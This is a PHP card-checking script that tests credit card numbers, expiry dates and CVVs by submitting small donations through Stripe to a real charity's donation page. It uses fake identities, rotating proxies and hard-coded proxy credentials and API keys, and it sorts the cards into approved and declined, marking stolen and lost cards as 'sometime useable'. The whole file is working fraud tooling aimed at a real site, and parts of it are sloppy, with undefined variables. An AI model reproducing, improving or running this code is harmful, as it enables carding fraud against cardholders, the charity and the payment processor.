<?php
    
    error_reporting(0);
    
 	//BY PINKY
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
	
	$lista = "$cc|$mes|$ano|$cvv";
	
    }
$last = substr($cc, 12, 16);
	
	function getBin($cc){
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
    } else {
     $pais = $pieces[5];
     $paiscode = $pieces[6];
     $level = $pieces[4];
     $banco = $pieces[2];
     $bandeira = $pieces[1];
    }
    return ''.$bandeira.' '.$banco.' '.$level.'('.$pais.')';
	}
	
	
$bin = substr($cc, 0, 6);
$bin = getBin($bin);	
	function GetStr($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    
      
                        
   $nome = dadosnome();
    $sobrenome = dadossobre();
   $email = $nome.$sobrenome.mt_rand(00,99);
    $stripped = preg_replace('/\s/', '', $email);
$email1 = strtolower($stripped);
    
   
   
    $keys = array(
	1 => 'pk_live_wiioL4zyDRkynifNw0F1l1nX'
	); 
    $key = array_rand($keys);
    $keyStripe = $keys[$key];
$username = 'lum-customer-hl_5e7d0d25-zone-static';
$password = '0p9095b5bvl2';

$port = 22225; 
$session = mt_rand(); 
$super_proxy = 'zproxy.lum-superproxy.io';
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
      
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];

/////////////////////////////////////PROXIES////////////////////////////////////////////////////
$username = 'gamingboy30'; 
$password = 'yourname'; 
$proxy = 'gate.smartproxy.com:7000'; 
////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
////////////////////////////////////////////////////////////1 req/////////////////////////////////========================================
$ch = curl_init('');
curl_setopt($target, CURLOPT_PROXY, $proxy); 
curl_setopt($target, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-2adbd669afe5a3fca9640f196c9614ac.html',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    ));    
curl_setopt($ch, CURLOPT_POSTFIELDS, 
'type=card&billing_details[name]='.$name.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=5e2e35e8-8cbc-4a6f-a821-1acf621fb7b8&muid=7cf4e750-f914-4f7f-8a3f-559769bf74d3&sid=6f90df5e-ff75-4785-914d-c541a6c3f30f&pasted_fields=number&payment_user_agent=stripe.js%2Fff7983d9%3B+stripe-js-v3%2Fff7983d9&time_on_page=787721&referrer=https%3A%2F%2Fspurgeons.org%2Fdonate%2F%3Fform-id%3D1862%26level-id%3D0%26payment-mode%3Dstripe%26form_id&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_17IKbLDa7jXqMGrJ');
$result1 = curl_exec($ch);
//echo $result1;
//$a = json_decode($result1, true);
//$token = $a['data']['tokenizeCreditCard']['token'];

//echo<b> Message </b> $result"; 
$token = trim(strip_tags(getstr($result1,'id": "','"')));
//echo "$token";

//////////////////////////////////////////////2 req  ///////////////////////////////////////////============================================

//////////////////////////////////////////////2 req  ///////////////////////////////////////////============================================

$ch = curl_init();
curl_setopt($target, CURLOPT_PROXY, $proxy); 
curl_setopt($target, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_URL, 'https://spurgeons.org/donate/?payment-mode=stripe');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: spurgeons.org',
'method: POST',
'path: /donate/?payment-mode=stripe',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: give_source=; give_medium=; give_campaign=; give_content=; __stripe_sid=6f90df5e-ff75-4785-914d-c541a6c3f30f; __stripe_mid=7cf4e750-f914-4f7f-8a3f-559769bf74d3; _fbp=fb.1.1594474389922.493879400; _ga=GA1.2.2098008456.1594474390; _gid=GA1.2.794531747.1594474390; wp-give_session_a389cb4dd83792fe51aca9d80b31acd6=2544f236c9b852d85a27c4e9bf6c54bc%7C%7C1595079485%7C%7C1595075885%7C%7C6c69482b38039cc76018de7542bc9b43; wp-give_session_reset_nonce_a389cb4dd83792fe51aca9d80b31acd6=1; __atuvc=4%7C28; __atuvs=5f09bf8942a0da95003',
'origin: https://spurgeons.org',
'referer: https://spurgeons.org/donate/?form-id=1862&level-id=0&payment-mode=stripe&form_id',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    ));

curl_setopt($ch, CURLOPT_POSTFIELDS, 
    'give-honeypot=&give-form-id-prefix=1862-1&give-form-id=1862&give-form-title=Donate+Now&give-current-url=https%3A%2F%2Fspurgeons.org%2Fdonate%2F&give-form-url=https%3A%2F%2Fspurgeons.org%2Fdonate%2F&give-form-minimum=1.00&give-form-maximum=999999.99&give-form-hash=8f83abde4b&give-price-id=0&give-amount=10.00&give-radio-donation-level=10.00&give_stripe_payment_method='.$token.'&give-fee-recovery-settings=%7B%22fee_recovery%22%3Afalse%7D&payment-mode=stripe&give_title=Mr.&give_first='.$name.'&give_last='.$last.'&give_email='.$name.'589%40gmail.com&card_name='.$name.'&billing_country=US&card_address='.$street.'&card_address_2=&card_city='.$city.'&card_state='.$state.'&card_zip='.$postcode.'&give_gift_check_is_billing_address=yes&give_gift_aid_address_option=billing_address&give_gift_aid_billing_country=GB&give_gift_aid_card_address=&give_gift_aid_card_address_2=&give_gift_aid_card_city=&give_gift_aid_card_state=&give_gift_aid_card_zip=&reason=&emailoptin=No&give_action=purchase&give-gateway=stripe');

$result = curl_exec($ch);
//echo ($result);
//$a = json_decode($result, true);
//$message = $a['error'];
$message = trim(GetStr($result, '<p><strong>Error</strong>','</p>'));
//echo "<b> Message </b> $message";
$info = curl_getinfo($ch,CURLINFO_TOTAL_TIME);
$net = substr($info,0,4)."sec";



$token = getStr($result2, '"message":"', '"');
$code = getStr($result2, '"decline_code": "', '"');

    
    //////////////////////===[Card Response] 
if (strpos($result, '"cvc_check":"pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「CV MATCHED ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span >✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif(strpos($result, '"message":"The zip code you supplied failed validation."' )) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「CVC MATCHED ZIP-NOT MATCHED✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「CVC MATCHED ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif(strpos($result, "Your card's security code is incorrect." )) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「CCN LIVE ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span >✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif(strpos($result, "Your card's security code is invalid." )) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「CCN LIVE ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span >✰ </br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「CCN LIVE ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「CVC MATCHED - Incorrect Zip ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Stolen_Card - Sometime Useable ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Lost_Card - Sometime Useable ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Insufficient Funds ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif(strpos($result, 'Your card has expipink.')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Card Expipink ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Pickup Card_Card - Sometime Useable ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」  </span >✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Incorrect Card Number ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge-">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Incorrect Card Number ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span> </br>';
}

elseif (strpos($result,  "generic_decline")) {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Declined : Generic_Decline ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span> </br>';
}
  elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Card Declined ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span> </br>';

}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Declined : Do_Not_Honor ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span> </br>';
}

elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Security Code Check : Fail ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span>✰ <span class="badge badge-success" style = Background-color:orange> 「NET:'.$net.'」  </span> </br>';
}
elseif (strpos($result, "expi#ffa801_card")) {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd#ffa801 Card ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span>✰ <span class="badge badge-success" style = Background-color:#ffa801> 「NET:'.$net.'」  </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「Card Doesnt Support This Purchase ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span> ✰ <span class="badge badge-success" style = Background-color:#ffa801> 「NET:'.$net.'」  </span></br>';
}
 else {
  echo '<span class="badge badge-danger">#Reprovadas</span> ✰ <span class="badge badge-success" style = "background-color:#f368e0">' . $lista . '</span> ✰ <span class="badge badge-success" style = Background-color:#5f27cd> 「'.$message.' ✩𝓒𝓻𝔂𝓹𝓽𝓸𝓢𝓽𝓪𝓻𝓴✩」 </span> ✰ <span class="badge badge-success" style = Background-color:#ffa801> 「NET:'.$net.'」  </span></br>';
}

curl_close($ch);
ob_flush();

//////=========Comment Echo $result If U Want To Hide Site Side Response 
